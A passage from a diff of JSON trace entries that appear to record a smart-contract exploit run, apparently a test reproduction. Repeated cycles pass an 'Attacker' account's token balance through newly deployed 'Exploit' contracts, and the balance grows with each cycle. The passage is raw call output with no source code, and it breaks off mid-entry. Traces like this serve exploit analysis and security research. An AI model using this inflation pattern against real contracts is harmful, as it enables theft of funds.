+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "59171562782451183285545876 [5.917e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x3C4293F66941ECa00f4950C10d4255d5c271bAeF], 59171562782451183285545876 [5.917e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x3C4293F66941ECa00f4950C10d4255d5c271bAeF]",
+        "original_code": null,
+        "description": null,
+        "return_value": "59171562782451183285545875 [5.917e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x3C4293F66941ECa00f4950C10d4255d5c271bAeF], 4923074023499938449357416 [4.923e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x3C4293F66941ECa00f4950C10d4255d5c271bAeF]",
+        "original_code": null,
+        "description": null,
+        "return_value": "64094636805951121734903291 [6.409e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 64094636805951121734903291 [6.409e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "64094636805951121734903291 [6.409e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x89CA9F4f77B267778EB2eA0Ba1bEAdEe8523af36], 64094636805951121734903291 [6.409e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x89CA9F4f77B267778EB2eA0Ba1bEAdEe8523af36]",
+        "original_code": null,
+        "description": null,
+        "return_value": "64094636805951121734903290 [6.409e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x89CA9F4f77B267778EB2eA0Ba1bEAdEe8523af36], 5332673782255133328343953 [5.332e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x89CA9F4f77B267778EB2eA0Ba1bEAdEe8523af36]",
+        "original_code": null,
+        "description": null,
+        "return_value": "69427310588206255063247243 [6.942e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 69427310588206255063247243 [6.942e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "69427310588206255063247243 [6.942e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0xe54a55121A47451c5727ADBAF9b9FC1643477e25], 69427310588206255063247243 [6.942e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xe54a55121A47451c5727ADBAF9b9FC1643477e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "69427310588206255063247242 [6.942e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0xe54a55121A47451c5727ADBAF9b9FC1643477e25], 5776352240938760421262170 [5.776e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xe54a55121A47451c5727ADBAF9b9FC1643477e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "75203662829145015484509412 [7.52e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 75203662829145015484509412 [7.52e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "75203662829145015484509412 [7.52e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x94771550282853f6E0124c302F7dE1Cf50aa45CA], 75203662829145015484509412 [7.52e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x94771550282853f6E0124c302F7dE1Cf50aa45CA]",
+        "original_code": null,
+        "description": null,
+        "return_value": "75203662829145015484509411 [7.52e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x94771550282853f6E0124c302F7dE1Cf50aa45CA], 6256944747384865288311182 [6.256e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x94771550282853f6E0124c302F7dE1Cf50aa45CA]",
+        "original_code": null,
+        "description": null,
+        "return_value": "81460607576529880772820593 [8.146e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 81460607576529880772820593 [8.146e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "81460607576529880772820593 [8.146e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x8227724C33C1748A42d1C1cD06e21AB8Deb6eB0A], 81460607576529880772820593 [8.146e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x8227724C33C1748A42d1C1cD06e21AB8Deb6eB0A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "81460607576529880772820592 [8.146e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x8227724C33C1748A42d1C1cD06e21AB8Deb6eB0A], 6777522550367286080298673 [6.777e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x8227724C33C1748A42d1C1cD06e21AB8Deb6eB0A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "88238130126897166853119265 [8.823e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 88238130126897166853119265 [8.823e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "88238130126897166853119265 [8.823e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x883816205341a6ba3C32AE8dAdCEbDD9d59BC2C4], 88238130126897166853119265 [8.823e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x883816205341a6ba3C32AE8dAdCEbDD9d59BC2C4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "88238130126897166853119264 [8.823e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x883816205341a6ba3C32AE8dAdCEbDD9d59BC2C4], 7341412426557844282179522 [7.341e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x883816205341a6ba3C32AE8dAdCEbDD9d59BC2C4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "95579542553455011135298786 [9.557e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 95579542553455011135298786 [9.557e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "95579542553455011135298786 [9.557e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0xe916cadb12C49389E487eB1e8194B1459b29B0eC], 95579542553455011135298786 [9.557e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xe916cadb12C49389E487eB1e8194B1459b29B0eC]",
+        "original_code": null,
+        "description": null,
+        "return_value": "95579542553455011135298785 [9.557e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0xe916cadb12C49389E487eB1e8194B1459b29B0eC], 7952217940447456926456858 [7.952e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xe916cadb12C49389E487eB1e8194B1459b29B0eC]",
+        "original_code": null,
+        "description": null,
+        "return_value": "103531760493902468061755643 [1.035e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 103531760493902468061755643 [1.035e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "103531760493902468061755643 [1.035e26]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x83898D1F3C03189fF03B471dd3456908FCA4423d], 103531760493902468061755643 [1.035e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x83898D1F3C03189fF03B471dd3456908FCA4423d]",
+        "original_code": null,
+        "description": null,
+        "return_value": "103531760493902468061755642 [1.035e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x83898D1F3C03189fF03B471dd3456908FCA4423d], 8613842473092685342738069 [8.613e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x83898D1F3C03189fF03B471dd3456908FCA4423d]",
+        "original_code": null,
+        "description": null,
+        "return_value": "112145602966995153404493711 [1.121e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 112145602966995153404493711 [1.121e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "112145602966995153404493711 [1.121e26]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x6AFc743aa4E9D98D0F53Ff111996E9817d79D301], 112145602966995153404493711 [1.121e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x6AFc743aa4E9D98D0F53Ff111996E9817d79D301]",
+        "original_code": null,
+        "description": null,
+        "return_value": "112145602966995153404493710 [1.121e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x6AFc743aa4E9D98D0F53Ff111996E9817d79D301], 9330514166853996763253876 [9.33e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x6AFc743aa4E9D98D0F53Ff111996E9817d79D301]",
+        "original_code": null,
+        "description": null,
+        "return_value": "121476117133849150167747586 [1.214e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 121476117133849150167747586 [1.214e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "121476117133849150167747586 [1.214e26]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x3450a15Dc9cbDD5C0e28cC22474D88AD7e2695A3], 121476117133849150167747586 [1.214e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x3450a15Dc9cbDD5C0e28cC22474D88AD7e2695A3]",
+        "original_code": null,
+        "description": null,
+        "return_value": "121476117133849150167747585 [1.214e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x3450a15Dc9cbDD5C0e28cC22474D88AD7e2695A3], 10106812945536249293956599 [1.01e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x3450a15Dc9cbDD5C0e28cC22474D88AD7e2695A3]",
+        "original_code": null,
+        "description": null,
+        "return_value": "131582930079385399461704184 [1.315e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 131582930079385399461704184 [1.315e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "131582930079385399461704184 [1.315e26]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0xE194aA6b80fFd71989dd196c7f84fa624b8d7D5d], 131582930079385399461704184 [1.315e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xE194aA6b80fFd71989dd196c7f84fa624b8d7D5d]",
+        "original_code": null,
+        "description": null,
+        "return_value": "131582930079385399461704183 [1.315e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0xE194aA6b80fFd71989dd196c7f84fa624b8d7D5d], 10947699782604865235213788 [1.094e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xE194aA6b80fFd71989dd196c7f84fa624b8d7D5d]",
+        "original_code": null,
+        "description": null,
+        "return_value": "142530629861990264696917971 [1.425e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 142530629861990264696917971 [1.425e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "142530629861990264696917971 [1.425e26]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x98E53ecDDd253E5A7f845a713D7fc8853CF47EDE], 142530629861990264696917971 [1.425e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x98E53ecDDd253E5A7f845a713D7fc8853CF47EDE]",
+        "original_code": null,
+        "description": null,
+        "return_value": "142530629861990264696917970 [1.425e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x98E53ecDDd253E5A7f845a713D7fc8853CF47EDE], 11858548404517590022783575 [1.185e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x98E53ecDDd253E5A7f845a713D7fc8853CF47EDE]",
+        "original_code": null,
+        "description": null,
+        "return_value": "154389178266507854719701545 [1.543e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 154389178266507854719701545 [1.543e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "154389178266507854719701545 [1.543e26]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x688B74D1C43f65C2236A81bdaADF85671Dfe8072], 154389178266507854719701545 [1.543e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x688B74D1C43f65C2236A81bdaADF85671Dfe8072]",
+        "original_code": null,
+        "description": null,
+        "return_value": "154389178266507854719701544 [1.543e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x688B74D1C43f65C2236A81bdaADF85671Dfe8072], 12845179631773453512679168 [1.284e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x688B74D1C43f65C2236A81bdaADF85671Dfe8072]",
+        "original_code": null,
+        "description": null,
+        "return_value": "167234357898281308232380712 [1.672e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 167234357898281308232380712 [1.672e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "167234357898281308232380712 [1.672e26]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0xe98c2E73E40560f5795a62f67e479927Af573340], 167234357898281308232380712 [1.672e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xe98c2E73E40560f5795a62f67e479927Af573340]",
+        "original_code": null,
+        "description": null,
+        "return_value": "167234357898281308232380711 [1.672e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0xe98c2E73E40560f5795a62f67e479927Af573340], 13913898577137004844934075 [1.391e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xe98c2E73E40560f5795a62f67e479927Af573340]",
+        "original_code": null,
+        "description": null,
+        "return_value": "181148256475418313077314786 [1.811e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 181148256475418313077314786 [1.811e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "181148256475418313077314786 [1.811e26]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x6C1Df8ffb37dC4e5059A335DDA7c5F3e5Be8CC2A], 181148256475418313077314786 [1.811e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x6C1Df8ffb37dC4e5059A335DDA7c5F3e5Be8CC2A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "181148256475418313077314785 [1.811e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x6C1Df8ffb37dC4e5059A335DDA7c5F3e5Be8CC2A], 15071534938754803648032590 [1.507e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x6C1Df8ffb37dC4e5059A335DDA7c5F3e5Be8CC2A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "196219791414173116725347375 [1.962e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 196219791414173116725347375 [1.962e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "196219791414173116725347375 [1.962e26]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x75C00fE81f8C251ffCE676f63E9db4a71a29F6DA], 196219791414173116725347375 [1.962e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x75C00fE81f8C251ffCE676f63E9db4a71a29F6DA]",
+        "original_code": null,
+        "description": null,
+        "return_value": "196219791414173116725347375 [1.962e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x75C00fE81f8C251ffCE676f63E9db4a71a29F6DA], 16325486645659203311548901 [1.632e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x75C00fE81f8C251ffCE676f63E9db4a71a29F6DA]",
+        "original_code": null,
+        "description": null,
+        "return_value": "212545278059832320036896275 [2.125e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 212545278059832320036896275 [2.125e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "212545278059832320036896275 [2.125e26]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x22b24e3bBa3087f537d2E35f8E2F1E9a257eAa98], 212545278059832320036896275 [2.125e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x22b24e3bBa3087f537d2E35f8E2F1E9a257eAa98]",
+        "original_code": null,
+        "description": null,
+        "return_value": "212545278059832320036896275 [2.125e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x22b24e3bBa3087f537d2E35f8E2F1E9a257eAa98], 17683767134578049027069770 [1.768e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x22b24e3bBa3087f537d2E35f8E2F1E9a257eAa98]",
+        "original_code": null,
+        "description": null,
+        "return_value": "230229045194410369063966044 [2.302e26]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 230229045194410369063966044 [2.302e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "230229045194410369063966044 [2.302e26]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0xa648d767E212563209D177FDe18476765D00a9eD], 230229045194410369063966044 [2.302e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xa648d767E212563209D177FDe18476765D00a9eD]",
+        "original_code": null,
+        "description": null,
+        "return_value": "230229045194410369063966043 [2.302e26]"
+    },
+    {
+        "id": "10844",
